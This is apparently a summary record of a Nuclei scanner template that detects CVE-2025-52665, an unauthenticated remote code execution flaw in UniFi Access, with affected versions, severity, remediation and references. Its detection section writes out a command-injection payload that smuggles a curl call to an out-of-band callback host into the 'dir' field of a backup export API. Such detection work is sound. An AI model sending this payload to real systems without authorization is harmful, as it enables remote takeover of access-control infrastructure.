---
cve_id: CVE-2025-52665
template_path: nuclei-templates/http/cves/2025/CVE-2025-52665.yaml
affected_product: UniFi Access
severity: critical
authentication: none
external_callback: true
affected_versions: 3.3.22 through 3.4.31
preconditions: [management network access]
poc_classification: rce
---

## Vulnerability
UniFi Access Application 3.3.22 through 3.4.31 suffers from broken access control (CWE-306) caused by a misconfiguration that exposes the management API without authentication. Attackers on the management network can reach management functions, enabling full remote code execution. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (score 10.0). Impact includes unauthorized system control. Remediation requires update to 4.0.21 or later.

## PoC / Detection
Classification: rce  
The template first issues `GET /login` (default port) with `host-redirects` to fingerprint UniFi OS via `status_code == 200` and body containing "UniFi OS" or "UniFi Dream Machine SE" (internal matcher). If matched, it sends `POST /api/ucore/backup/export` on port 9780 with JSON `{"dir":"/tmp/{{rand_string}}-; curl http://{{interactsh-url}}/; #"}` (randomized dir + command injection). Confirmation occurs on DNS interactsh callback.

## References
- https://community.ui.com/releases/Security-Advisory-Bulletin-056-056/ce97352d-91cd-40a7-a2f4-2c73b3b30191
- https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
- https://nvd.nist.gov/vuln/detail/CVE-2025-52665
